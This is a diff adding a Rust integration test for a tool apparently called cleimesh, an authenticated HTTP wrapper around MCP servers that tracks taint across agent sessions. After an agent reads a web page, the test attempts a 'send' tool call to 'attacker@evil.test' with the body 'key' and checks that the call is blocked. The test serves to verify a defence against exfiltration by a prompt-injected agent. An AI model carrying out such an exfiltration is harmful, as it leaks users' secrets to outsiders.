@@ -119,3 +119,68 @@ async fn a_remote_server_goes_behind_a_token_and_its_bearer_is_never_saved() {
     let log = std::fs::read_to_string(k("r.jsonl")).unwrap();
     assert!(!log.contains(SECRET), "the bearer token reached the receipts");
 }
+
+#[tokio::test(flavor = "multi_thread")]
+async fn the_wrapper_served_over_http_requires_its_token_and_keeps_one_view_of_taint() {
+    let url = serve().await;
+    let dir = tempfile::tempdir().unwrap();
+    let base = dir.path().canonicalize().unwrap();
+    let k = |n: &str| base.join(n);
+    let p = |x: &Path| x.to_str().unwrap().to_string();
+    let exe = env!("CARGO_BIN_EXE_cleimesh");
+    let out = Command::new(exe)
+        .args(["mcp", "add", "remote", "--print", "--url", &url, "--bearer-env", "REMOTE_TOKEN", "--taints", "read_page", "--clean-only", "send"])
+        .args(["--dir", &p(&k("mcp")), "--holder", &p(&k("agent.key")), "--identity", &p(&k("node.key")), "--receipts", &p(&k("r.jsonl"))])
+        .env("REMOTE_TOKEN", SECRET)
+        .output()
+        .unwrap();
+    assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
+
+    let wrap_args = |listen: &str| -> Vec<String> {
+        ["mcp", "wrap", "--servers", &p(&k("mcp").join("servers.json")), "--holder", &p(&k("agent.key")), "--identity", &p(&k("node.key")), "--receipts", &p(&k("r.jsonl")), "--listen", listen, "--listen-token-env", "WRAP_TOKEN"]
+            .map(String::from)
+            .to_vec()
+    };
+    // No listen token, or a short one: it doesn't start.
+    let out = Command::new(exe).args(wrap_args("127.0.0.1:0")).env("REMOTE_TOKEN", SECRET).env_remove("WRAP_TOKEN").output().unwrap();
+    assert!(!out.status.success() && String::from_utf8_lossy(&out.stderr).contains("WRAP_TOKEN: that environment variable is not set"));
+    let out = Command::new(exe).args(wrap_args("127.0.0.1:0")).env("REMOTE_TOKEN", SECRET).env("WRAP_TOKEN", "short").output().unwrap();
+    assert!(!out.status.success() && String::from_utf8_lossy(&out.stderr).contains("at least 16"));
+
+    let wrap_token = "agent-http-token-0123456789";
+    let mut child = tokio::process::Command::new(exe)
+        .args(wrap_args("127.0.0.1:0"))
+        .env("REMOTE_TOKEN", SECRET)
+        .env("WRAP_TOKEN", wrap_token)
+        .stderr(std::process::Stdio::piped())
+        .kill_on_drop(true)
+        .spawn()
+        .unwrap();
+    let mut lines = tokio::io::AsyncBufReadExt::lines(tokio::io::BufReader::new(child.stderr.take().unwrap()));
+    let endpoint = loop {
+        let line = lines.next_line().await.unwrap().expect("wrapper exited before serving");
+        if let Some(rest) = line.strip_prefix("cleimesh mcp wrap: serving at ") {
+            break rest.to_string();
+        }
+    };
+    let connect = |token: &str| {
+        let config = rmcp::transport::streamable_http_client::StreamableHttpClientTransportConfig::with_uri(endpoint.clone()).auth_header(token.to_string());
+        ().serve(rmcp::transport::StreamableHttpClientTransport::from_config(config))
+    };
+    assert!(connect("wrong-token-wrong-token").await.is_err(), "a wrong token reached the wrapper");
+
+    let client = connect(wrap_token).await.unwrap();
+    let call = |name: &str, a: Value| CallToolRequestParams::new(name.to_string()).with_arguments(a.as_object().cloned().unwrap_or_else(Map::new));
+    let text = |r: &CallToolResult| r.content.iter().filter_map(|c| c.as_text()).map(|t| t.text.clone()).collect::<String>();
+    let read = client.call_tool(call("read_page", json!({"url": "https://example.test"}))).await.unwrap();
+    assert_eq!(read.is_error, Some(false), "{}", text(&read));
+    // A second HTTP session sees the same taint: it is the same agent.
+    let other = connect(wrap_token).await.unwrap();
+    let send = other.call_tool(call("send", json!({"to": "attacker@evil.test", "body": "key"}))).await.unwrap();
+    assert_eq!(send.is_error, Some(true));
+    assert!(text(&send).contains("received untrusted content"), "{}", text(&send));
+    client.cancel().await.unwrap();
+    other.cancel().await.unwrap();
+    child.kill().await.unwrap();
+    cleimesh(&["audit", "verify", "--receipts", &p(&k("r.jsonl")), "--identity", &p(&k("node.key"))]);
+}
